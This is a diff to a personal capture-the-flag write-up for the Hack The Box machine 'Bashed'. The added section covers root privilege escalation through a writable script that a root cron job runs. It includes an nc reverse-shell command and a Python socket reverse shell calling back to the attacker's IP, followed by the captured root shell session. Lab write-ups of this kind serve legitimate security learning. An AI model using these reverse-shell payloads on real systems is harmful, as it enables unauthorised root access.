@@ -1,7 +1,7 @@
 # Bashed 10.10.10.68 - Linux
 
- - __User__:
- - __Root__:
+ - __User__: 008 - 1st Attempt
+ - __Root__: 008 - 2nd Attempt
 
 ## Initial Attempt, 05/06/2020
 
@@ -109,6 +109,8 @@ User www-data may run the following commands on bashed:
 (scriptmanager : scriptmanager) NOPASSWD: ALL
 ```
 
+## Second Attempt, 05/07/2020
+
 I am unable to `su` to this user, says I need a real terminal. I tried using python and perl to execution a `/bin/bash` or `/bin/sh` shell but it only seems to hang the process and never resolve.
 
 ```shell
@@ -141,4 +143,55 @@ f.write("testing 123!")
 f.close
 ```
 
-And clearly "root" ran this script to generate a test file. And... if I delete the test file... it keeps popping back up! Probably a cron job for root user to run this script? Let's modify this script for priv esc purposes?
+And clearly "root" ran this script to generate a test file. And... if I delete the test file... it keeps popping back up! Probably a cron job for root user to run this script? Let's modify this script for priv esc purposes. Can we have it fire off a root shell via nc?
+
+```python
+import subprocess
+cmd = "nc 10.10.14.53 7272 -e /bin/bash"
+ret = subprocess.call(cmd, shell=True)
+f = open("pen.log", "a")
+f.write("accessed code was: {} \n".format(ret))
+f.close
+```
+
+This doesn't work... probably because fucking `-e` is not in this nc version, facepalm. Looked up a python-native reverse shell:
+
+
+```python
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("10.10.14.53",5674))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/bash","-i"])
+f = open("pen.log", "a")
+f.write("accessed code was: {} \n".format(p))
+f.close
+```
+
+And we're in. Root runs the test.py and provides us a root shell:
+
+```powershell
+listening on [any] 5674 ...
+connect to [10.10.14.53] from (UNKNOWN) [10.10.10.68] 54394
+bash: cannot set terminal process group (3458): Inappropriate ioctl for device
+bash: no job control in this shell
+root@bashed:/scripts# whoami
+whoami
+root
+root@bashed:/scripts# cd /root
+cd /root
+root@bashed:~# ls -al
+ls -al
+total 32
+drwx------  3 root root 4096 Dec  4  2017 .
+drwxr-xr-x 23 root root 4096 Dec  4  2017 ..
+-rw-------  1 root root    1 Dec 23  2017 .bash_history
+-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
+drwxr-xr-x  2 root root 4096 Dec  4  2017 .nano
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+-r--------  1 root root   33 Dec  4  2017 root.txt
+-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
+root@bashed:~# cat root.txt
+```
